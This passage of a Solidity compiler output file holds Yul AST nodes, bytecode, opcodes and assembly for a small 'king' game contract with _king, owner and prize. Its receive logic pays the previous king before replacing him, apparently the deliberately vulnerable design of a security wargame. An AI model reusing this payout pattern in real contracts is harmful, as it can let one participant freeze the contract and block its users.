																"src": "481:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "473:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "553:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "566:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "577:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "562:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "562:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "509:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "509:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "509:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "435:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "447:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "458:4:1",
														"type": ""
													}
												],
												"src": "365:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "638:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "648:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "659:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "648:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "620:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "630:7:1",
														"type": ""
													}
												],
												"src": "593:77:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "741:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "758:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "781:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "763:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "763:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "751:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "751:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "751:37:1"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "729:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "736:3:1",
														"type": ""
													}
												],
												"src": "676:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "898:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "908:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "920:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "931:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "916:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "916:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "908:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "988:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1001:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1012:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "997:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "997:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "944:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "944:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "944:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "870:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "882:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "893:4:1",
														"type": ""
													}
												],
												"src": "800:222:1"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052600436106100385760003560e01c806329cc6d6f146101585780638da5cb5b14610183578063e3ac5d26146101ae57610153565b36610153576001543410158061009b5750600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b6100a457600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc349081150290604051600060405180830381858888f1935050505015801561010a573d6000803e3d6000fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550346001819055005b600080fd5b34801561016457600080fd5b5061016d6101d9565b60405161017a919061026f565b60405180910390f35b34801561018f57600080fd5b50610198610202565b6040516101a5919061026f565b60405180910390f35b3480156101ba57600080fd5b506101c3610228565b6040516101d091906102a3565b60405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015481565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102598261022e565b9050919050565b6102698161024e565b82525050565b60006020820190506102846000830184610260565b92915050565b6000819050919050565b61029d8161028a565b82525050565b60006020820190506102b86000830184610294565b9291505056fea2646970667358221220c7de98535304e97e5507ad5232f1b2f65c0241d67cb56820dc72decb93512a2d64736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x38 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x29CC6D6F EQ PUSH2 0x158 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x183 JUMPI DUP1 PUSH4 0xE3AC5D26 EQ PUSH2 0x1AE JUMPI PUSH2 0x153 JUMP JUMPDEST CALLDATASIZE PUSH2 0x153 JUMPI PUSH1 0x1 SLOAD CALLVALUE LT ISZERO DUP1 PUSH2 0x9B JUMPI POP PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ JUMPDEST PUSH2 0xA4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC CALLVALUE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x10A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE PUSH1 0x1 DUP2 SWAP1 SSTORE STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x164 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x16D PUSH2 0x1D9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x17A SWAP2 SWAP1 PUSH2 0x26F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x18F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x198 PUSH2 0x202 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1A5 SWAP2 SWAP1 PUSH2 0x26F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1BA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1C3 PUSH2 0x228 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1D0 SWAP2 SWAP1 PUSH2 0x2A3 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x2 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x259 DUP3 PUSH2 0x22E JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x269 DUP2 PUSH2 0x24E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x284 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x260 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x29D DUP2 PUSH2 0x28A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2B8 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x294 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC7 0xDE SWAP9 MSTORE8 MSTORE8 DIV 0xE9 PUSH31 0x5507AD5232F1B2F65C0241D67CB56820DC72DECB93512A2D64736F6C634300 ADDMOD GT STOP CALLER ",
							"sourceMap": "59:454:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;310:5;;297:9;:18;;:41;;;;333:5;;;;;;;;;;;319:19;;:10;:19;;;297:41;289:50;;;;;;354:4;;;;;;;;;;346:22;;:33;369:9;346:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;393:10;386:4;;:17;;;;;;;;;;;;;;;;;;418:9;410:5;:17;;;;59:454;;;;439:71;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;119:20;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;97:17;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;439:71;477:7;500:4;;;;;;;;;;;493:11;;439:71;:::o;119:20::-;;;;;;;;;;;;;:::o;97:17::-;;;;:::o;7:126:1:-;44:7;84:42;77:5;73:54;62:65;;7:126;;;:::o;139:96::-;176:7;205:24;223:5;205:24;:::i;:::-;194:35;;139:96;;;:::o;241:118::-;328:24;346:5;328:24;:::i;:::-;323:3;316:37;241:118;;:::o;365:222::-;458:4;496:2;485:9;481:18;473:26;;509:71;577:1;566:9;562:17;553:6;509:71;:::i;:::-;365:222;;;;:::o;593:77::-;630:7;659:5;648:16;;593:77;;;:::o;676:118::-;763:24;781:5;763:24;:::i;:::-;758:3;751:37;676:118;;:::o;800:222::-;893:4;931:2;920:9;916:18;908:26;;944:71;1012:1;1001:9;997:17;988:6;944:71;:::i;:::-;800:222;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "151200",
								"executionCost": "70817",
								"totalCost": "222017"
							},
							"external": {
								"_king()": "2500",
								"owner()": "2514",
								"prize()": "2451"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 59,
									"end": 513,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 59,
									"end": 513,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 59,
									"end": 513,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 183,
									"end": 193,
									"name": "CALLER",
									"source": 0
								},
								{
									"begin": 175,
									"end": 180,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 175,
									"end": 180,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 175,
									"end": 193,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 175,
									"end": 193,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 175,
									"end": 193,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 175,
									"end": 193,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 175,
									"end": 193,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 209,
									"end": 219,
									"name": "CALLER",
									"source": 0
								},
								{
									"begin": 202,
									"end": 206,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 202,
									"end": 206,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 202,
									"end": 219,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 202,
									"end": 219,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 202,
									"end": 219,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 202,
									"end": 219,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 234,
									"end": 243,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 226,
									"end": 231,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 226,
									"end": 243,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 226,
									"end": 243,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 226,
									"end": 243,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 226,
									"end": 243,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 59,
									"end": 513,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 59,
									"end": 513,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 59,
									"end": 513,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 59,
									"end": 513,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 59,
									"end": 513,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 59,
									"end": 513,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 59,
									"end": 513,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220c7de98535304e97e5507ad5232f1b2f65c0241d67cb56820dc72decb93512a2d64736f6c63430008110033",
									".code": [
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "29CC6D6F"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "8DA5CB5B"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH",
											"source": 0,
											"value": "E3AC5D26"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 59,
											"end": 513,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 59,
											"end": 513,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 310,
											"end": 315,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 310,
											"end": 315,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 297,
											"end": 306,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 297,
											"end": 315,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 297,
											"end": 315,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 297,
											"end": 338,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 297,
											"end": 338,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 297,
											"end": 338,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 297,
											"end": 338,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 333,
											"end": 338,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 333,
											"end": 338,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 333,
											"end": 338,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 333,
											"end": 338,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 333,
											"end": 338,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 333,
											"end": 338,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 333,
											"end": 338,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 333,
											"end": 338,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 333,
											"end": 338,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 333,
											"end": 338,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 333,
											"end": 338,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 319,
											"end": 338,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 319,
											"end": 338,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 319,
											"end": 329,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 319,
											"end": 338,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 319,
											"end": 338,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 319,
											"end": 338,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 297,
											"end": 338,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 297,
											"end": 338,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 289,
											"end": 339,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 289,
											"end": 339,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 289,
											"end": 339,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 289,
											"end": 339,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 289,
											"end": 339,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 289,
											"end": 339,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 289,
											"end": 339,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 354,
											"end": 358,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 354,
											"end": 358,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 354,
											"end": 358,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 354,
											"end": 358,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 354,
											"end": 358,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 354,
											"end": 358,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 354,
											"end": 358,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 354,
											"end": 358,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 354,
											"end": 358,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 354,
											"end": 358,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 346,
											"end": 368,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 346,
											"end": 368,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 369,
											"end": 378,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 346,
											"end": 379,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 346,
											"end": 379,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 346,
											"end": 379,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 346,
											"end": 379,
											"name": "DUP1",
											"source": 0
										},
										{
